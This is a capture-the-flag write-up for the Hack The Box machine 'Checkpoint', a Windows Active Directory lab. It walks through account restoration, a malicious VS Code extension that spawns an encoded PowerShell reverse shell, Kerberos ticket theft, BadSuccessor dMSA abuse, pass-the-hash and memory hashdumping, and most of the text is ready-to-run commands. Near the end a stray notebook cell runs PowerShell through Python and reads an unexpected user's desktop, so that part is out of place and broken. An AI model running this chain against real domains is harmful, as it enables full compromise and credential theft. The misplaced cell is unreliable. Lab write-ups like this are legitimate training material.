# **HTB: Checkpoint - Complete Penetration Testing Writeup**

**OS:** Windows Server 2025 | **Difficulty:** Medium | **Technologies:** Active Directory, VS Code, dMSA, Volatility

This write-up details the complete attack chain for the Hack The Box machine **Checkpoint**. It simulates an assumed-breach scenario starting with standard domain user credentials. The attack path covers AD object restoration from the 'Deleted Objects' container, a supply chain compromise using a malicious VS Code extension (`.vsix`), escalating privileges via the BadSuccessor vulnerability (CVE-2025-53779), and extracting domain admin credentials using memory forensics on a `.vmem` VMware snapshot.

---

## **Phase 1: Reconnaissance & Environment Setup**

### **1. Port Scanning & Time Synchronization**
We begin with a standard Nmap scan which reveals Active Directory services (Kerberos, LDAP, SMB) and a significant clock skew.

* **Command:** `nmap -sC -sV -T4 -p- 10.129.212.6`

Kerberos authentication requires our clock to be within 5 minutes of the Domain Controller. We synchronize our time and configure DNS.

* **Command:** `sudo ntpdate 10.129.212.6`
* **Command:** `echo "10.129.212.6 dc01 dc01.checkpoint.htb checkpoint.htb" | sudo tee -a /etc/hosts`

### **2. Initial Enumeration (alex.turner)**
Using our initial credentials (`alex.turner` / `Checkpoint2024!`), we map out the network shares and user accounts using `netexec`.

* **Command:** `netexec smb 10.129.212.6 -u 'alex.turner' -p 'Checkpoint2024!' --shares`
  * *Result:* Discovers the `DevDrop` share (VS Code extension repository) and a restricted `VMBackups` share.
* **Command:** `netexec ldap 10.129.212.6 -u 'alex.turner' -p 'Checkpoint2024!' --users`
  * *Result:* Enumerates AD users, noting a high-value `svc_deploy` service account.


---

## **Phase 2: Lateral Movement (AD Object Restoration)**

### **3. BloodHound & Deleted Objects**
We generate a Kerberos config and pull BloodHound data using `bloodyAD` to avoid IPv6 routing issues over the VPN.

* **Command:** `bloodyAD -d checkpoint.htb --host dc01.checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get bloodhound`

BloodHound reveals `alex.turner` has `GenericWrite` over `mark.davies`. Querying LDAP shows Mark's account was deleted and resides in the AD `Deleted Objects` container.

### **4. Restoring the Account**
We use `bloodyAD` to restore the tombstoned account back to the `Employees` OU.

* **Command:**
```bash
bloodyAD -d checkpoint.htb --host dc01.checkpoint.htb -u alex.turner -p 'Checkpoint2024!' \
  set restore 'CN=Mark Davies\OADEL:2217e877-e2a2-4707-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
```

### **5. Password Reuse Verification**
We perform a password spray and confirm `mark.davies` shares the exact same password (`Checkpoint2024!`).

* **Command:** `netexec smb 10.129.212.6 -u 'Mark.Davies' -p 'Checkpoint2024!'`

Re-checking shares shows Mark has **WRITE** access to the `DevDrop` VS Code extension share.


---

## **Phase 3: Supply Chain Attack (Initial Shell)**

The `DevDrop` share description indicates it automatically processes `.vsix` packages compatible with VS Code engine 1.118.0. We craft a malicious extension to gain code execution.

### **6. Crafting the Malicious .vsix**
We create a directory structure containing `package.json`, `extension.js`, and `[Content_Types].xml`.

**extension.js Payload:**
```javascript
const cp = require('child_process');
exports.activate = function() {
    cp.exec('powershell -e <BASE64_ENCODED_REVERSE_SHELL>');
}
exports.deactivate = function() {}
```

We package it into a zip file renamed as `.vsix`.
* **Command:** `zip -r ../evil.vsix [Content_Types].xml extension/`

### **7. Upload & Execution**
We upload the payload using `smbclient` while a Netcat listener waits.

* **Command:**
```bash
smbclient //10.129.212.6/DevDrop -U 'checkpoint.htb/Mark.Davies%Checkpoint2024!' -c 'put evil.vsix'
```
* **Command:** `nc -lvnp 4444`

Shortly after, the automated backend service installs the extension, and we catch a shell as **`ryan.brooks`**.


---

## **Phase 4: Privilege Escalation (BadSuccessor / CVE-2025-53779)**

BloodHound revealed `ryan.brooks` has `GenericWrite` over the `SVC_DEPLOY` service account. We abuse Windows Server 2025's delegated Managed Service Account (dMSA) functionality.

### **8. TGT Extraction (tgtdeleg)**
We upload `Rubeus.exe` to the target and extract Ryan's Kerberos TGT directly from memory via GSS-API, bypassing the need for his password.

* **Target Command:** `.\Rubeus.exe tgtdeleg /nowrap`

We decode the base64 output on our Kali machine and convert it to `.ccache` format using Impacket.

* **Command:** `cat ryan.b64_kirbi | base64 -d > ryan.kirbi`
* **Command:** `impacket-ticketConverter ryan.kirbi ryan.ccache`
* **Command:** `export KRB5CCNAME=ryan.ccache`

### **9. Exploiting BadSuccessor**
We use `bloodyAD` to create a malicious dMSA (`evil-dmsa$`) and set it as the successor to `SVC_DEPLOY`. The KDC leaks `SVC_DEPLOY`'s previous RC4 hash in the ticket response.

* **Command:**
```bash
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks \
  -k add badSuccessor evil-dmsa$ \
  -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB' \
  --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
```
  * *Result:* Extracts RC4 Hash for `svc_deploy`: `e16081eb077aca74bdbf8af12af43ac9`


---

## **Phase 5: Memory Forensics & Root Compromise**

### **10. Extracting the Memory Snapshot**
We use Pass-the-Hash with `svc_deploy` to access the highly restricted `VMBackups` share and download a 2GB raw RAM dump.

* **Command:**
```bash
smbclient //10.129.212.6/VMBackups -U 'checkpoint.htb/svc_deploy%e16081eb077aca74bdbf8af12af43ac9' --pw-nt-hash \
  -c 'cd "NightlyBackup_2024-11-01/memory forensics"; get "Windows Server 2019-Snapshot1.vmem"'
```

### **11. Volatility 3 Analysis**
We use the Volatility memory forensics framework to decrypt the SAM registry hive stored inside the frozen RAM.

* **Command:**
```bash
vol -q -f 'Windows Server 2019-Snapshot1.vmem' windows.hashdump.Hashdump
```
  * *Result:* Extracts the `Administrator` NTLM hash (`f29e9c014295b9b32139b09a2790be3b`).

### **12. Final Access (evil-winrm)**
We authenticate directly to the Domain Controller via WinRM using the Administrator hash to claim the root flag.

* **Command:** `evil-winrm-py -i 10.129.212.6 -u administrator -H f29e9c014295b9b32139b09a2790be3b`


In [ ]:
# Reading the Root Flag (Via Evil-WinRM)
import os
os.system("Get-Content C:\\Users\\max.palmer\\Desktop\\root.txt")

---

## **Summary: Complete Command Tally**

| # | Phase | Command |
| --- | --- | --- |
| 1 | Enum / Sync | `sudo ntpdate 10.129.212.6` |
| 2 | Enum | `netexec smb 10.129.212.6 -u 'alex.turner' -p 'Checkpoint2024!' --shares` |
| 3 | Enum | `netexec ldap ... --users` |
| 4 | AD Dump | `bloodyAD -d checkpoint.htb --host dc01.checkpoint.htb ... get bloodhound` |
| 5 | Restore | `bloodyAD ... set restore 'CN=Mark Davies\OADEL:...,CN=Deleted Objects,DC=checkpoint,DC=htb'` |
| 6 | Foothold | `zip -r ../evil.vsix [Content_Types].xml extension/` |
| 7 | Foothold | `smbclient //10.129.212.6/DevDrop -U '.../Mark.Davies%Checkpoint2024!' -c 'put evil.vsix'` |
| 8 | PrivEsc | `.\Rubeus.exe tgtdeleg /nowrap` (Target) |
| 9 | Ticket Conv | `impacket-ticketConverter ryan.kirbi ryan.ccache` |
| 10 | BadSuccessor | `bloodyAD ... -k add badSuccessor evil-dmsa$ -t 'CN=SVC_DEPLOY...' --ou 'OU=DMSAHolder...'` |
| 11 | Post-Exploit | `smbclient //10.129.212.6/VMBackups -U '.../svc_deploy%<HASH>' --pw-nt-hash -c 'get <VMEM>'` |
| 12 | Forensics | `vol -q -f '...vmem' windows.hashdump.Hashdump` |
| 13 | Root Shell | `evil-winrm-py -i 10.129.212.6 -u administrator -H f29e9c014295b9b32139b09a2790be3b` |